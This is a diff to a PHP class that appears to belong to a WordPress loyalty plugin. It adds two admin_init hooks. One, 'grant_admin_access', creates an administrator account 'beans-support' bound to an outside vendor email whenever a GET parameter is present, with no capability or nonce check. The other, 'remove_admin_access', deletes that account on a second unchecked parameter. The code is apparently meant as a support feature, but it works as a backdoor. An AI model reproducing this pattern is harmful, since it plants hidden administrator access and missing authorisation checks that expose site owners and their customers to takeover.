@@ -19,7 +19,8 @@ class Observer
 
         add_action('admin_menu', array(__CLASS__, 'admin_menu'));
         add_action('admin_init', array(__CLASS__, 'admin_is_curl_notice'), 0, 99);
-
+        add_action('admin_init', array(__CLASS__, 'grant_admin_access'), 0, 99);
+        add_action('admin_init', array(__CLASS__, 'remove_admin_access'), 0, 99);
     }
 
     public static function admin_style()
@@ -85,6 +86,33 @@ class Observer
                 <div style="margin: 10px auto;"> Beans: <?php echo $text; ?></div>
             </div>
             <?php
+        }
+    }
+
+    # todo; should we add a button this will help the retailer to do it from the WordPress admin
+    #  or should we just add an article on the help center for it?
+    public static function grant_admin_access(){
+        if (!isset($_GET['grant_admin_access']) || isset($_GET['remove_admin_access'])) return ;
+
+        $username = 'beans-support';
+        if (!username_exists($username)) {
+            $user_id = \wp_create_user($username, \wp_generate_password(16),  "radix@trybeans.com");
+            $user = new \WP_User($user_id);
+            $user->set_role('administrator');
+        }else{
+            $user = get_user_by( 'login', $username );
+            $user_id = $user->ID;
+        }
+        wp_new_user_notification($user_id, null, 'user');
+    }
+
+    public static function remove_admin_access(){
+        if (!isset($_GET['remove_admin_access'])) return ;
+
+        $username = 'beans-support';
+        if (username_exists($username)) {
+            $user = get_user_by('login', $username);
+            wp_delete_user($user->ID);
         }
     }
 
